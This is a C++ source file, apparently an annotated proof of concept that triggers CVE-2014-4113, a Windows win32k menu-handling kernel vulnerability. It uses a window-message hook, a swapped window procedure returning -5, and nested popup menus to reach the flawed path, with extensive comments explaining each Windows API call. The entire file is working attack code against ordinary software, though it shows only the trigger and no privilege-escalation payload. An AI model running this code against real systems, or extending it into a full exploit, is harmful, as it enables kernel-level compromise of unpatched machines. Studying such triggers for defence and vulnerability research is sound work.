// Trigger.cpp : Triggers CVE-2014-4113
//

#include "stdafx.h"
#include <Windows.h>

//Destroys the menu and then returns -5, this will be passed to xxxSendMessage which will then use it as a pointer.
LRESULT CALLBACK HookCallbackTwo(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	printf("Callback two called.\n");
	EndMenu();
	return -5;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
	printf("Callback one called.\n");
	/* lParam is a pointer to a CWPSTRUCT which is defined as:
	typedef struct tagCWPSTRUCT {
	LPARAM lParam;
	WPARAM wParam;
	UINT   message;
	HWND   hwnd;
	} CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;
	*/
	//lparam+8 is the message sent to the window, here we are checking for the message which is sent to a window when the function xxxMNFindWindowFromPoint is called
	if (*(DWORD *)(lParam + 8) == 0x1EB) {
		if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) {
			//lparam+12 is a Window Handle pointing to the window - here we are setting its callback to be our second one
			SetWindowLongA(*(HWND *)(lParam + 12), GWLP_WNDPROC, (LONG)HookCallbackTwo);
		}
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

/*
LRESULT WINAPI DefWindowProc(
_In_ HWND   hWnd,
_In_ UINT   Msg,
_In_ WPARAM wParam,
_In_ LPARAM lParam
);
hWnd => Handle of the Window the event was triggered on
Msg => Message, the event that has occurred, this could be that window has moved, has been minimized, clicked on etc
wParam, lParam => extra information depending on the msg recieved.
*/
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	/*
	Wait until the window is idle and then send the messages needed to 'click' on the submenu to trigger the bug
	*/
	printf("WindProc called with message=%d\n", msg);
	if (msg == WM_ENTERIDLE) {
		PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);
		PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
		PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
	}
	//Just pass any other messages to the default window procedure
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

void _tmain()
{

	/*
	typedef struct tagWNDCLASS {
	UINT      style;
	WNDPROC   lpfnWndProc;
	int       cbClsExtra;
	int       cbWndExtra;
	HINSTANCE hInstance;
	HICON     hIcon;
	HCURSOR   hCursor;
	HBRUSH    hbrBackground;
	LPCTSTR   lpszMenuName;
	LPCTSTR   lpszClassName;
	} WNDCLASS, *PWNDCLASS;
	We don't care about any of the style information but we set any needed values below.
	*/
	WNDCLASSA wnd_class = { 0 };
	//Our custome WndProc handler, inspects any window messages before passing then onto the default handler
	wnd_class.lpfnWndProc = WndProc;
	//Returns a handle to the executable that has the name passed to it, passing NULL means it returns a handle to this executable
	wnd_class.hInstance = GetModuleHandle(NULL);
	//Random classname - we reference this later when creating a Window of this class
	wnd_class.lpszClassName = "abcde";

	//Registers the class in the global scope so it can be refered too later.
	ATOM tmp = RegisterClassA(&wnd_class);
	if (tmp == NULL){
		printf("Failed to register window class.\n");
		return;
	}

	/* Does what it says on the tin..
	HWND WINAPI CreateWindow(
	_In_opt_ LPCTSTR   lpClassName, => The name of the Window class to be created, in this case the class we just registered
	_In_opt_ LPCTSTR   lpWindowName, => The name to give the window, we don't need to give it a name.
	_In_     DWORD     dwStyle, => Style options for the window, here
	_In_     int       x, => x position to create the window,this time the left edge
	_In_     int       y, => y position to create the window, this time the top edge
	_In_     int       nWidth, => Width of the window to create, randomly chosen value
	_In_     int       nHeight, => Height of the to create, randomly chosen value
	_In_opt_ HWND      hWndParent, => A handle to the parent window, this is our only window so NULL
	_In_opt_ HMENU     hMenu, => A handle to a menu or sub window to attach to the window, we havent created any yet.
	_In_opt_ HINSTANCE hInstance, => A handle to the module the window should be associated with, for us this executable
	_In_opt_ LPVOID    lpParam => A pointer to data to be passed to the Window with the WM_CREATE message on creation, NULL for us as we don't wish to pass anything.
	);
	*/
	HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, "", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 640, 480, NULL, NULL, wnd_class.hInstance, NULL);

	if (main_wnd == NULL){
		printf("Failed to create window instance.\n");
		return;
	}

	//Creates an empty popup menu
	HMENU MenuOne = CreatePopupMenu();

	if (MenuOne == NULL){
		printf("Failed to create popup menu one.\n");
		return;
	}

	/*Menu properties to apply to the empty menu we just created
	typedef struct tagMENUITEMINFO {
	UINT      cbSize;
	UINT      fMask;
	UINT      fType;
	UINT      fState;
	UINT      wID;
	HMENU     hSubMenu;
	HBITMAP   hbmpChecked;
	HBITMAP   hbmpUnchecked;
	ULONG_PTR dwItemData;
	LPTSTR    dwTypeData;
	UINT      cch;
	HBITMAP   hbmpItem;
	} MENUITEMINFO, *LPMENUITEMINFO;
	*/
	MENUITEMINFOA MenuOneInfo = { 0 };
	//Default size
	MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);
	//Selects what properties to retrieve or set when GetMenuItemInfo/SetMenuItemInfo are called, in this case only dwTypeData which the contents of the menu item.
	MenuOneInfo.fMask = MIIM_STRING;
	/*Inserts a new menu at the specified position
	BOOL WINAPI InsertMenuItem(
	_In_ HMENU           hMenu, => Handle to the menu the new item should be inserted into, in our case the empty menu we just created
	_In_ UINT            uItem, => it should item 0 in the menu
	_In_ BOOL            fByPosition, => Decided whether uItem is a position or an identifier, in this case its a position. If FALSE it makes uItem an identifier
	_In_ LPCMENUITEMINFO lpmii => A pointer to the MENUITEMINFO structure that contains the menu item details.
	);
	*/
	BOOL insertMenuItem = InsertMenuItemA(MenuOne, 0, TRUE, &MenuOneInfo);

	if (!insertMenuItem){
		printf("Failed to insert popup menu one.\n");
		DestroyMenu(MenuOne);
		return;
	}

	HMENU MenuTwo = CreatePopupMenu();

	if (MenuTwo == NULL){
		printf("Failed to create menu two.\n");
		DestroyMenu(MenuOne);
		return;
	}

	MENUITEMINFOA MenuTwoInfo = { 0 };
	MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
	//On this window hSubMenu should be included in Get/SetMenuItemInfo
	MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
	//The menu is a sub menu of the first menu
	MenuTwoInfo.hSubMenu = MenuOne;
	//The contents of the menu item - in this case nothing
	MenuTwoInfo.dwTypeData = "";
	//The length of the menu item text - in the case 1 for just a single NULL byte
	MenuTwoInfo.cch = 1;
	insertMenuItem = InsertMenuItemA(MenuTwo, 0, TRUE, &MenuTwoInfo);

	if (!insertMenuItem){
		printf("Failed to insert second pop-up menu.\n");
		DestroyMenu(MenuOne);
		DestroyMenu(MenuTwo);
		return;
	}

	/*
	HHOOK WINAPI SetWindowsHookEx(
	_In_ int       idHook, => The type of hook we want to create, in this case WH_CALLWNDPROC which means that the callback will be passed any window messages before the system sends them to the destination window procedure.
	_In_ HOOKPROC  lpfn, => The callback that should be called when triggered
	_In_ HINSTANCE hMod, => If the hook functions is in a dll we pass a handle to the dll here, not needed in this case.
	_In_ DWORD     dwThreadId => The thread which the callback should be triggered in, we want it to be our current thread.
	);
	*/
	HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());

	if (setWindowsHook == NULL){
		printf("Failed to insert call back one.\n");
		DestroyMenu(MenuOne);
		DestroyMenu(MenuTwo);
		return;
	}

	/* Displays a menu and tracks interactions with it.
	BOOL WINAPI TrackPopupMenu(
	_In_           HMENU hMenu,
	_In_           UINT  uFlags,
	_In_           int   x,
	_In_           int   y,
	_In_           int   nReserved,
	_In_           HWND  hWnd,
	_In_opt_ const RECT  *prcRect
	);
	*/
	TrackPopupMenu(
		MenuTwo, //Handle to the menu we want to display, for us its the submenu we just created.
		0, //Options on how the menu is aligned, what clicks are allowed etc, we don't care.
		0, //Horizontal position - left hand side
		0, //Vertical position - Top edge
		0, //Reserved field, has to be 0
		main_wnd, //Handle to the Window which owns the menu
		NULL //This value is always ignored...
		);
}